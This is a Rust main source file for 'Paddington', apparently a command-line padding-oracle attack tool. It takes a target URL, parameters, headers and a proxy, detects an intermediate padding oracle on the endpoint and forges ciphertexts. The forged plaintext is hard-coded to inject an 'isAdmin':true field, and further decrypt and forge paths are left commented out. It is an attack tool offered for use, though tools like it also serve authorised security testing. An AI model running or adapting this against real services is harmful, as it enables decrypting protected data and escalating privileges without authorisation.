
use std::time::Duration;

use clap::{Parser, ValueEnum};
use futures::future::join_all;
use strum_macros::Display;
use tokio::{sync::mpsc, time::sleep};

use reqwest::{ Method};
use crate::{crypt::{cradlehelpers::{ComputeCache, build_cradle, decrypt_intermediate_block}, detector::{Detector, IntermediateDetector}}, helper::{Config, Encoding, encode_ct}, oracle::{IntermediateOracle, Oracle}, print::fmt_bytes_custom, transport::HTTPTransport};

pub mod crypt;
pub mod errors;
pub mod helper;
pub mod print;
pub mod oracle;
pub mod transport;

#[derive(Display, Debug, Clone, ValueEnum)]
enum Block {
    SMALL,
    MED,
    LARGE,
    AUTO
}

#[derive(Display, Debug, Clone, ValueEnum, PartialEq)]
enum Attack {
    DOUBLE,
    SINGLE,
    INTER,
    ALL,
}

#[derive(Parser, Debug, Clone)]
#[command(name = "Paddington", version, about = "Padding Oracles Ain't Dead!")]
struct Args {
    ///url for the vulnerable endpoint
    #[arg(short, long)]
    url: String,

    ///params to scan, can be url parameters, body parameters, or headers, alternatively surround the value you want to analyze with "@{ }@"
    #[arg(short, long)]
    params: Vec<String>,

    ///add headers to the request
    #[arg(short = 'H', long)]
    headers: Vec<String>,

    ///add the request body
    #[arg(short, long)]
    data: Option<String>,

    ///the request method to use [default: GET]
    #[arg(short, long, ignore_case = true)]
    method: Option<Method>,

    #[arg(
        short,
        long,
        help = "the encoding to use for the bytes, you can specify multiple encodings and they will be used in order.\nexample: if a string is base64 encoded then URL encoded, use \"-e url\" to url decode, and then \n\"-e b64\" to base64 decode [default: b64]"
    )]
    encoding: Vec<Encoding>,

    ///the number of threads to use
    #[arg(short, long, default_value_t = 10)]
    threads: usize,

    ///the plaintext to forge
    #[arg(short, long)]
    forge: Option<String>,

    ///the block size to use (small = 8) (med = 16) (large = 32)
    #[arg(short, long, ignore_case = true, default_value_t = Block::AUTO)]
    block_size: Block,

    ///the search string to match a response with valid padding
    #[arg(short, long)]
    search_pat: Option<String>,

    ///the proxy to use
    #[arg(long)]
    proxy: Option<String>,

    ///override the ciphertext to use
    #[arg(short, long)]
    ciphertext: Option<String>,

    ///add a prefix to the ciphertext (IV) encoded the same way as the ciphertext
    #[arg(short, long)]
    iv: Option<String>,

    #[arg(short, long, ignore_case = true, default_value_t = Attack::ALL, help = "the attack type to use, (single = standard attack) (double = double ciphertext attack) \n(inter = intermediate ciphertext attack, not implemented yet)")]
    attack: Attack,

    ///number of times to retry when no valid byte found
    #[arg(short, long, default_value_t = 5)]
    retry: usize,
}

#[tokio::main]
async fn main() {
    let args = Args::parse();
    let mut encoding = args.encoding.clone();
    if args.encoding.len() <= 0 {
        encoding = vec![Encoding::B64];
    }

    let mut config = Config::new();
    let block_sizes: &[u8] = match args.block_size {
        Block::SMALL => &[8],
        Block::MED => &[16],
        Block::LARGE => &[32],
        Block::AUTO => &[8,16,32]
    };
    for block_size in block_sizes {
        let args = args.clone();
        config.set("blk_size".to_string(), (*block_size).to_string());
        config.set("threads".to_string(), args.threads.to_string());
        config.set("retry".to_string(), args.retry.to_string());

        let mut headers: Vec<(String, String)> = vec![];
        for header in &args.headers {
            let header_parts = header.split(':').map(String::from).collect::<Vec<String>>();
            if header_parts.len() >= 2 {
                // get the val and remove leading whitespace
                let header_val = header_parts[1..].join("").trim_ascii_start().to_string();
                headers.push((header_parts[0].clone(), header_val));
            }
        }

        let standard_transport = Box::new(HTTPTransport::new(
            (&args.url).to_owned().clone(),
            headers.clone(),
            args.method.clone().unwrap_or(Method::GET),
            args.data.clone(),
            encoding.clone(),
            args.params.clone(),
            args.search_pat.clone(),
            args.proxy.clone(),
        ));
        let standard_ct = standard_transport.base_ct.clone();

        let detect = IntermediateDetector::init(&standard_ct, standard_transport, *block_size as usize, args.threads).await;
        if let Ok(detector) = detect{
            println!("Intermediate Oracle Detected");
            let bad_chars = vec![ 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11,0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x22];
            //let bad_chars = vec![ 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc,0xfd,0xfe,0xff];
            let (tx, rx) = mpsc::channel(255);
            let intermediate_oracle = IntermediateOracle::new(detector, tx, *block_size as usize, &bad_chars);
            //let pt = intermediate_oracle.decrypt(&standard_ct).await;
            // if let Ok(pt) = pt{
            //     println!("plaintext {:?}", fmt_bytes_custom(&pt));
            // }
            let ct = intermediate_oracle.forge(&standard_ct, "hello world!\",\"isAdmin\":true}".as_bytes()).await;
            if let Ok(ct) = ct{
                println!("{:?}",encode_ct(&ct, encoding.clone()));
            }
            
        }else{
            println!("No Intermediate Oracle Detected");
        }
        // let double_oracle = Box::new(HTTPDoubleOracle::new(
        //     args.url,
        //     headers,
        //     args.method.unwrap_or(Method::GET),
        //     args.data,
        //     encoding.clone(),
        //     args.params,
        //     args.search_pat,
        //     args.proxy,
        // ));
        // let double_ct = double_oracle.base_ct.clone();

        // let mut oracles: Vec<(Box<dyn Oracle>, Vec<u8>, String)> = vec![];

        // if args.attack == Attack::ALL || args.attack == Attack::SINGLE {
        //     oracles.push((
        //         standard_oracle,
        //         standard_ct,
        //         String::from("\nTesting standard padding oracle, block size: ".to_owned()+&block_size.to_string()),
        //     ));
        // }
        // if args.attack == Attack::ALL || args.attack == Attack::DOUBLE {
        //     oracles.push((
        //         double_oracle,
        //         double_ct,
        //         String::from("\nTesting double padding oracle, block size: ".to_owned()+&block_size.to_string()),
        //     ));
        // }

        // // find ct_len for the progress bar
        // let mut ct_len = oracles[0].1.len() - *block_size as usize;
        // if let Some(ref pt) = args.forge {
        //     ct_len = ((pt.len() / *block_size as usize) + 1) * *block_size as usize;
        // } else {
        //     if let Some(ref ct_override) = args.ciphertext {
        //         ct_len = decode_ct(ct_override.to_string(), encoding.clone()).len() - *block_size as usize;
        //     }
        //     if let Some(ref iv) = args.iv {
        //         ct_len += decode_ct(iv.to_string(), encoding.clone()).len()
        //     }
        // }

        // // this section runs the padding oracle attack
        // for (oracle, base_ct, log) in oracles {
        //     // this section here is just to print the progress bar
        //     let (tx, rx) = mpsc::channel::<Messages>(255);
        //     progress_bar(ct_len, rx);
        //     println!("\n{}", log);
        //     let mut ct = base_ct.clone();
        //     if let Some(override_ct) = args.ciphertext.clone() {
        //         ct = decode_ct(override_ct, encoding.clone());
        //     }
        //     if let Some(iv) = args.iv.clone() {
        //         let iv = decode_ct(iv, encoding.clone());
        //         ct = iv.iter().chain(ct.iter()).cloned().collect();
        //     }
        //     if let Some(forge_string) = args.forge.clone() {
        //         let result = padding_oracle_forge(
        //             forge_string.as_bytes(),
        //             &ct.clone(),
        //             oracle,
        //             tx.clone(),
        //             config.clone(),
        //         )
        //         .await;
        //         if let Ok(ct) = result {
        //             println!(
        //                 "\nforged ciphertext: {}",
        //                 encode_ct(&ct, encoding)
        //                     .expect("Error: forged ciphertext cannot be displayed as utf-8")
        //             );
        //             return;
        //         }
        //     } else {
        //         let res = padding_oracle_decrypt(&ct.clone(), oracle, tx.clone(), config.clone()).await;
        //         if let Ok(res) = res {
        //             println!("\nplaintext: {}", fmt_bytes_custom(&res));
        //             return;
        //         }
        //     }
        // }
    }
}
